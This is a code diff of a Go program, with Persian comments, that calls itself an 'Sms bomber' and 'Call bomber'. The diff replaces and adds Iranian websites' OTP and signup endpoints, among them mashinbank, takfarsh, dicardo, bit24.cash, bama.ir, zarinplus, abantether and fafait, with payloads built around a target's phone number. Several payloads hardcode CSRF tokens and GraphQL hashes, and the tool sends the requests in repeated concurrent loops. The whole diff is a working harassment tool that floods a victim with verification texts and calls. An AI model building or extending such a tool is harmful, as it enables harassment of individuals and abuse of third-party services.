@@ -117,7 +117,7 @@ func sendJSONRequest(client *http.Client, ctx context.Context, serviceName, url 
 			}
 		}
 
-		// --- بخش اضافه شده برای دیباگ (باقی می ماند) ---
+		// --- بخش اضافه شده برای دیباگ ---
 		if resp.StatusCode < 400 && resp.StatusCode != 0 {
             limitedReader := io.LimitReader(resp.Body, bodyReadLimit)
 			bodyBytes, readErr := io.ReadAll(limitedReader)
@@ -193,7 +193,7 @@ func sendFormRequest(client *http.Client, ctx context.Context, serviceName, url 
 			}
 		}
 
-		// --- بخش اضافه شده برای دیباگ (باقی می ماند) ---
+		// --- بخش اضافه شده برای دیباگ ---
 		if resp.StatusCode < 400 && resp.StatusCode != 0 {
             limitedReader := io.LimitReader(resp.Body, bodyReadLimit)
 			bodyBytes, readErr := io.ReadAll(limitedReader)
@@ -320,8 +320,8 @@ func main() {
 `)
 	fmt.Print("\033[0m")
 
-	// تعداد کل سرویس هایی که اضافه می کنیم (1 سرویس قبلی + 8 سرویس جدید = 9 سرویس) - شمارش دقیق تر 11 endpoint است.
-	numberOfServices := 11 // MCIShop (1) + جدید (10 endpoint از 8 سرویس)
+	// تعداد کل سرویس هایی که اضافه می کنیم (1 سرویس قبلی + 13 Endpoint جدید = 14 سرویس)
+	numberOfServices := 14 // MCIShop (1) + جدید (13 Endpoint)
 	fmt.Printf("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m%d\n", numberOfServices)
 	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n") // این عدد 6 ثابت باقی مانده
 
@@ -385,7 +385,7 @@ func main() {
 	// اضافه کردن Task ها به کانال tasks
 	for i := 0; i < repeatCount; i++ {
 
-		// --- سرویس 1: MCIShop ---
+		// --- سرویس: MCIShop ---
 		wg.Add(1)
 		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
 			return func() {
@@ -396,115 +396,175 @@ func main() {
 			}
 		}(client, phone) // capture client and phone
 
-
-		// --- سرویس جدید: tagmond.com (Step 1 - Request) ---
+		// --- سرویس جدید: mashinbank.com ---
 		wg.Add(1)
 		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
 			return func() {
-				formData := url.Values{
-					"utf8":                       {"✓"},
-					"custom_comment_body_hp_24124": {""},
-					"phone_number":               {originalPhone}, // فرمت 09...
-					"recaptcha":                  {""}, // این فیلد احتمالاً نیاز به توکن داینامیک داره
+				payload := map[string]interface{}{
+					"mobileNumber": originalPhone, // فرمت 09...
 				}
-				sendFormRequest(c, ctx, "tagmond.com", "https://tagmond.com/phone_number", formData, &wg, ch)
+				sendJSONRequest(c, ctx, "mashinbank.com", "https://mashinbank.com/api2/users/check", payload, &wg, ch)
 			}
 		}(client, phone) // capture client and phone
 
-		// --- سرویس جدید: chamedoun.com ---
+		// --- سرویس جدید: takfarsh.com ---
 		wg.Add(1)
 		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
 			return func() {
 				formData := url.Values{
+					"action":   {"voorodak__submit-username"},
+					"username": {originalPhone}, // فرمت 09...
+					"security": {"6e887b3a6d"}, // توجه: احتمال داینامیک بودن
+				}
+				sendFormRequest(c, ctx, "takfarsh.com", "https://takfarsh.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client, phone) // capture client and phone
+
+		// --- سرویس جدید: dicardo.com ---
+		wg.Add(1)
+		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
+			return func() {
+				formData := url.Values{
+					"csrf_dicardo_name": {"225a834ed22125cc08474f311f86c65a"}, // توجه: احتمال داینامیک بودن (CSRF Token)
 					"phone":           {originalPhone}, // فرمت 09...
-					"_token":          {"2g3ZsjtssNSDLB7qschLqd1KEF3Ic4AkSD6w66d"}, // توجه: به احتمال بسیار زیاد داینامیک (CSRF Token?)
-					"recaptcha_token": {"03AFc..."}, // توجه: به احتمال بسیار زیاد داینامیک (Recaptcha Token)
+					"type":            {"0"},
+					"codmoaref":       {""},
 				}
-				sendFormRequest(c, ctx, "chamedoun.com", "https://chamedoun.com/auth/sms/register", formData, &wg, ch)
+				sendFormRequest(c, ctx, "dicardo.com", "https://dicardo.com/sendotp", formData, &wg, ch)
 			}
 		}(client, phone) // capture client and phone
 
-		// --- سرویس جدید: gateway.wisgoon.com ---
-		wg.Add(1)
-		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
-			return func() {
-				payload := map[string]interface{}{
-					"phone":              originalPhone, // فرمت 09...
-					"token":              "e622c330c77a17c8426e638d7a85da6c2ec9f455AbCode", // توجه: احتمال داینامیک بودن
-					"recaptcha-response": "03AFc...", // توجه: به احتمال بسیار زیاد داینامیک (Recaptcha Token)
-				}
-				sendJSONRequest(c, ctx, "wisgoon.com", "https://gateway.wisgoon.com/api/v1/auth/login/", payload, &wg, ch)
-			}
-		}(client, phone) // capture client and phone
-
-		// --- سرویس جدید: api.bitpin.org ---
-		wg.Add(1)
-		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
-			return func() {
-				payload := map[string]interface{}{
-					"device_type": "web",
-					"password":    "guhguihifgov3", // توجه: این پارامتر مشکوک است، ممکن است Endpoint مربوط به OTP نباشد
-					"phone":       originalPhone, // فرمت 09...
-				}
-				sendJSONRequest(c, ctx, "bitpin.org", "https://api.bitpin.org/v3/usr/authenticate/", payload, &wg, ch)
-			}
-		}(client, phone) // capture client and phone
-
-		// --- سرویس جدید: auth.mrbilit.ir (GET) ---
+		// --- سرویس جدید: bit24.cash (Check User) ---
 		wg.Add(1)
 		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
 			return func() {
 				// در GET، پارامتر به URL اضافه می شود
-				urlWithParam := fmt.Sprintf("https://auth.mrbilit.ir/api/Token/send?mobile=%s", originalPhone) // فرمت 09...
-				sendGETRequest(c, ctx, "mrbilit.ir", urlWithParam, &wg, ch)
+				urlWithParam := fmt.Sprintf("https://bit24.cash/auth/api/sso/v2/users/auth/check-user-registered?country_code=98&mobile=%s", originalPhone) // فرمت 09...
+				sendGETRequest(c, ctx, "bit24.cash (Check)", urlWithParam, &wg, ch)
 			}
 		}(client, phone) // capture client and phone
 
-		// --- سرویس جدید: melix.shop (Validate) ---
+		// --- سرویس جدید: bit24.cash (Send Code) ---
 		wg.Add(1)
 		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
 			return func() {
 				payload := map[string]interface{}{
-					"mobile": originalPhone, // فرمت 09...
+					"country_code": "98",
+					"mobile":       originalPhone, // فرمت 09...
 				}
-				sendJSONRequest(c, ctx, "melix.shop (Validate)", "https://melix.shop/site/api/v1/user/validate", payload, &wg, ch)
+				sendJSONRequest(c, ctx, "bit24.cash (Send)", "https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", payload, &wg, ch)
 			}
 		}(client, phone) // capture client and phone
 
-		// --- سرویس جدید: delino.com (PreRegister) ---
+		// --- سرویس جدید: account.bama.ir ---
 		wg.Add(1)
 		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
 			return func() {
 				formData := url.Values{
-					"mobile": {originalPhone}, // فرمت 09...
+					"username":  {originalPhone}, // فرمت 09...
+					"client_id": {"popuplogin"},
 				}
-				sendFormRequest(c, ctx, "delino.com (PreRegister)", "https://www.delino.com/User/PreRegister", formData, &wg, ch)
+				sendFormRequest(c, ctx, "account.bama.ir", "https://account.bama.ir/api/otp/generate/v4", formData, &wg, ch)
 			}
 		}(client, phone) // capture client and phone
 
-		// --- سرویس جدید: delino.com (Register) ---
-		wg.Add(1)
-		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
-			return func() {
-				formData := url.Values{
-					"mobile": {originalPhone}, // فرمت 09...
-				}
-				sendFormRequest(c, ctx, "delino.com (Register)", "https://www.delino.com/user/register", formData, &wg, ch)
-			}
-		}(client, phone) // capture client and phone
-
-		// --- سرویس جدید: api.timcheh.com ---
+		// --- سرویس جدید: lms.tamland.ir ---
 		wg.Add(1)
 		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
 			return func() {
 				payload := map[string]interface{}{
-					"mobile": originalPhone, // فرمت 09...
+					"Mobile":       originalPhone, // فرمت 09...
+					"SchoolId":     -1,
+					"consultantId": "tamland",
+					"campaign":     "campaign",
+					"utmMedium":    "wordpress",
+					"utmSource":    "tamland",
 				}
-				sendJSONRequest(c, ctx, "timcheh.com", "https://api.timcheh.com/auth/otp/send", payload, &wg, ch)
+				sendJSONRequest(c, ctx, "lms.tamland.ir", "https://lms.tamland.ir/api/api/user/signup", payload, &wg, ch)
 			}
 		}(client, phone) // capture client and phone
 
-		// --- سرویس جدید: beta.raghamapp.com ---
+		// --- سرویس جدید: api.zarinplus.com ---
+		wg.Add(1)
+		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
+			return func() {
+				payload := map[string]interface{}{
+					"phone_number": getPhoneNumber98NoZero(originalPhone), // فرمت 989...
+					"source":       "zarinplus",
+				}
+				sendJSONRequest(c, ctx, "api.zarinplus.com", "https://api.zarinplus.com/user/otp/", payload, &wg, ch)
+			}
+		}(client, phone) // capture client and phone
+
+		// --- سرویس جدید: api.abantether.com ---
+		wg.Add(1)
+		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
+			return func() {
+				payload := map[string]interface{}{
+					"phone_number": originalPhone, // فرمت 09...
+				}
+				sendJSONRequest(c, ctx, "api.abantether.com", "https://api.abantether.com/api/v2/auths/register/phone/send", payload, &wg, ch)
+			}
+		}(client, phone) // capture client and phone
+
+		// --- سرویس جدید: bck.behtarino.com ---
+		wg.Add(1)
+		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
+			return func() {
+				payload := map[string]interface{}{
+					"phone": originalPhone, // فرمت 09...
+				}
+				sendJSONRequest(c, ctx, "bck.behtarino.com", "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", payload, &wg, ch)
+			}
+		}(client, phone) // capture client and phone
+
+		// --- سرویس جدید: web-api.fafait.net (hasUser - GraphQL) ---
+		wg.Add(1)
+		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
+			return func() {
+				// بدنه پیچیده JSON برای GraphQL
+				payload := map[string]interface{}{
+					"operationName": "hasUser",
+					"variables": map[string]interface{}{
+						"input": map[string]interface{}{
+							"username": originalPhone, // فرمت 09...
+						},
+					},
+					"extensions": map[string]interface{}{
+						"persistedQuery": map[string]interface{}{
+							"version":    1,
+							"sha256Hash": "00fbd099cf5cad12af5114cff9e4676649ba70b9c4c6c3d1ebfcd68972bc1a3f", // این hash هم ممکن است داینامیک باشد
+						},
+					},
+				}
+				sendJSONRequest(c, ctx, "fafait.net (hasUser)", "https://web-api.fafait.net/api/graphql", payload, &wg, ch)
+			}
+		}(client, phone) // capture client and phone
+
+		// --- سرویس جدید: web-api.fafait.net (Send Code - GraphQL) ---
+		wg.Add(1)
+		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
+			return func() {
+				// بدنه پیچیده JSON برای GraphQL
+				payload := map[string]interface{}{
+					"variables": map[string]interface{}{
+						"input": map[string]interface{}{
+							"mobile": originalPhone, // فرمت 09...
+							"nickname": "generated_user", // مقدار ثابت برای نام کاربری در صورت نیاز
+						},
+					},
+					"extensions": map[string]interface{}{
+						"persistedQuery": map[string]interface{}{
+							"version":    1,
+							"sha256Hash": "c86ec16685cd22d6b486686908526066b38df6f4cbcd29bef07bb2f3b18061e6", // این hash هم ممکن است داینامیک باشد
+						},
+					},
+				}
+				sendJSONRequest(c, ctx, "fafait.net (Send Code)", "https://web-api.fafait.net/api/graphql", payload, &wg, ch)
+			}
+		}(client, phone) // capture client and phone
+
+		// --- سرویس: beta.raghamapp.com (دوباره اضافه شد) ---
 		wg.Add(1)
 		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
 			return func() {
